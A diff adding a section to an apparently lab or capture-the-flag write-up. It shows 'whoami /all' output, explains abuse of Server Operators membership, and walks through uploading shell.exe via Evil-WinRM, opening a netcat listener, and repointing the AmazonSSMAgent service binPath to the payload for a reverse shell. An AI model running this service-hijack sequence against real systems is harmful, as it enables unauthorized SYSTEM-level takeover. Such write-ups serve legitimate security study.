@@ -205,9 +205,109 @@ To check for privilege escalation oportunities, I ran the following command:
 
 ```
 $ whoami /all
+USER INFORMATION
+----------------
+
+User Name       SID
+=============== ============================================
+services\j.rock S-1-5-21-1966530601-3185510712-10604624-1111
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID          Attributes
+=========================================== ================ ============ ==================================================
+Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Server Operators                    Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                         State
+============================= =================================== =======
+SeSystemtimePrivilege         Change the system time              Enabled
+SeShutdownPrivilege           Shut down the system                Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
+SeRemoteShutdownPrivilege     Force shutdown from a remote system Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set      Enabled
+SeTimeZonePrivilege           Change the time zone                Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+
+```
+
+The user is part of the Server Operators Group.
+
+The Server Operators group stands out because its members have elevated privileges, such as the ability to modify service 
+configurations, including changing the binary path and starting or stopping services. 
+
+These privileges can be exploited by an attacker to escalate their access, potentially leading to system-level control.
+
+
+
 
 
 ```
+
+```
+
+Uploading the shell.exe executable 
+
+```
+*Evil-WinRM* PS C:\Users\j.rock\Documents> upload /home/andrepaiva/shell.exe
+                                        
+Info: Uploading /home/andrepaiva/shell.exe to C:\Users\j.rock\Documents\shell.exe
+                                        
+Data: 9556 bytes of 9556 bytes copied
+                                        
+Info: Upload successful!
+
+```
+
+Seting up an netcat listener of my machine.
+
+```
+$ nc -lvp 4444
+```
+
+Changing the binary path of the AmazonSSMAgent service.
+
+```
+*Evil-WinRM* PS C:\Users\j.rock\Documents> sc.exe config AmazonSSMAgent binPath="C:\Users\j.rock\Documents\shell.exe"
+[SC] ChangeServiceConfig SUCCESS
+```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 
 
